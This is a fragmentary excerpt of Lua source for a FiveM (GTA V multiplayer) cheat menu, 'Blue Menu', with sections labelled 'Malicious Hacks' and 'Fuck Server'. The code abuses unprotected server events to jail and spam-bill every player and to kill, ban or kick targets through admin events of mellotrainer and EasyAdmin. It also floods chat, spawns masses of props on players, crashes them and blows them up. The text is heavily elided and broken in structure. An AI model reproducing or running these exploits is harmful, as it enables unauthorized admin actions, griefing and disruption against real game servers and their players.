...
function Plane.CreateMenu(id, title)
    ...
    Citizen.CreateThread(function()
        while true do
            ...
            menus[id].titleBackgroundColor = { r = 69, g = 0, b = 0, a = 255 }
            menus[id].menuFocusBackgroundColor = { r = 69, g = 0, b = 0, a = 255 }
        end
    end)    
    menus[id].titleBackgroundColor = { r = 240, g = 240, b = 248, a = 255 }
                    ...
                    function()
                        ...
                        for i = 0, 128 do
                            local dl =
                                ...
                                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                                local obj = CreateObject(GetHashKey("prop_rock_4_big2"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_beachflag_le"),coords.x,coords.y,coords.z,true,true,true)
                                ...
                                local obj = CreateObject(GetHashKey("prop_abat_slide"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_air_bridge01"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_air_bridge02"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("p_crahsed_heli_s"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_air_cargoloader_01"),coords.x,coords.y,coords.z,true,true,true)
                                local obj = CreateObject(GetHashKey("prop_fireescape_02b"),coords.x,coords.y,coords.z,true,true,true)
    ...
    function()
        while true do
            ...
            if banallusers then
                ...
                TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "")
                    end
                end
        ...
        SetEntityVisible(ped, false);
            ...
            if fall then
             ...
             if chatspam then
                ...
                TriggerServerEvent('', '', {0, 0x99, 255}, '')
        for bs=0,9 do
        TriggerServerEvent("","~r~",{141,211,255},"; !  ♕#")
        end
            end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Blue Menu")
        Plane.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
        Plane.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        Plane.CreateSubMenu("World", "MainMenu", "World")
        ...
        Plane.CreateSubMenu("Fuck", "MainMenu", "Fuck")
        ...
        local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            ...
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "Credits", "SettingsMenu", "World", "VRPMenu"}


        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Blue~s~Menu")
                drawNotification("~h~~s~Made by ~b~Blue")
                if Plane.MenuButton("∑~g~Self Menu  ~h~~r~»", "SelfMenu") then
                elseif Plane.MenuButton("∑Settings  ~h~~r~»", "SettingsMenu") then
                elseif Plane.MenuButton("∑World  ~h~~r~»", "World") then
                elseif Plane.MenuButton("∑Teleport Menu ~h~~r~»", "TeleportMenu") then
                elseif Plane.MenuButton("∑AI Menu", "AI ~h~~r~»") then
                elseif Plane.MenuButton("∑Online~s~ Players ~h~~r~»", "OnlinePlayersMenu") then
                elseif Plane.MenuButton("∑Weapon Menu ~h~~r~»", "WeaponMenu") then
                elseif Plane.MenuButton("∑Vehicle Menu ~h~~r~»", "VehMenu") then
                elseif Plane.MenuButton("∑Malicious Hacks ~h~~r~»", "MaliciousMenu") then
                elseif Plane.MenuButton("∑FUCK Player ~h~~r~»", "TrollMenu") then
                elseif Plane.MenuButton("∑ESX~s~ Options ~h~~r~»", "ESXMenu") then
                elseif Plane.MenuButton("∑Fuck ~s~Server ~h~~r~»", "Fuck") then
                elseif Plane.MenuButton("∑VRP~s~ Options ~h~~r~»", "VRPMenu") then
                elseif Plane.MenuButton("∑Credits ~h~~r~»", "Credits") then
                elseif Plane.Button("∑~h~~r~Disable Menu ~h~~r~»") then
                    Enabled = false
                end
            ...
            elseif Plane.IsMenuOpened("VRPMenu") then
                ...
                Plane.Display()
            elseif Plane.IsMenuOpened("SettingsMenu") then
                if Plane.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    ...
                    then
                elseif Plane.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
        ...
        Plane.Display()
            elseif Plane.IsMenuOpened("World") then
            if
                Plane.CheckBox(
                "~h~ESP",
                esp3,
            ...
            then
            elseif Plane.Button("~h~~r~Building~s~ New") then
        ...
        Plane.Display()
        elseif Plane.IsMenuOpened("Fuck") then
        if Plane.Button("~h~~r~Give All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
                ...
                elseif Plane.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
                    for ids = 0, 128 do
                        if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
                            for i = 1, #allWeapons do
    ...
    then
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
                ...
                for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "", "6969696969")
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
                    ...
                    local playerVeh = GetVehiclePedIsIn(playerPed, true)
                        SetVehicleNumberPlateText(playerVeh, "Desudo")
                    else
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
                ...
                elseif Plane.IsMenuOpened("Credits") then
                    if Plane.Button("∑~r~~h~FUCK") then
                elseif Plane.Button("∑~o~~h~FUCK") then
                elseif Plane.Button("∑~y~~h~FUCK") then
                elseif Plane.Button("∑~g~~h~Don't Share it") then
                elseif Plane.Button("∑~b~~h~ - Developer") then
                elseif Plane.Button("∑~p~~h~Blue - Developer") then
                elseif Plane.Button("∑~h~Menu - Inspiration") then
                end
                Plane.Display()
                ...
                elseif Plane.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                   ...
                   elseif Plane.Button("Cage Player 2") then
                   freezePlayer = true
                   Citizen.Wait(10)
                   ...
                   freezePlayer = false
                    ...
                    elseif Plane.Button("~b~Fuck Engine ~r~NEW") then
                 ...
                 elseif Plane.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                ...
                elseif Plane.Button('~h~~r~Banana ~p~Party') then
                ...
                elseif Plane.Button('~h~~r~Hamburgher ~s~Player') then
                ...
                elseif Plane.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif Plane.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                ...
                elseif Plane.Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif Plane.Button("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif Plane.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 

 
                elseif Plane.Button("~b~Repair Vehicle ~r~NEW") then
                    NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                ...
                elseif Plane.Button("~b~Fuck Car ~r~NEW ") then
                    local playerPed = GetPlayerPed(SelectedPlayer)
                    local playerVeh = GetVehiclePedIsIn(playerPed, true)
                    NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                        ...
                        SetVehicleNumberPlateText(playerVeh, "Blue")
                ...
                elseif Plane.Button("~r~ KILL") then
                    TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
                elseif Plane.Button("~r~ BAN") then
                    TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
                elseif Plane.Button("~r~ KICK") then
                    TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Hack Mady By :  Blue" )
                    TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "Hack Mady By :  Blue" )
                ...
                elseif Plane.IsMenuOpened("SpawnPropsMenu") then
                    ...
                    elseif Plane.Button("Weed") then
                        ...
                        elseif Plane.Button("AirBridge01") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_air_bridge01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                        ...
                        elseif Plane.Button("AirBridge02") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_air_bridge02"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                        ...
                        elseif Plane.Button("AirCargoLoader01") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_air_cargoloader_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                        ...
                        elseif Plane.Button("PropFireescape02") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_fireescape_02b"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
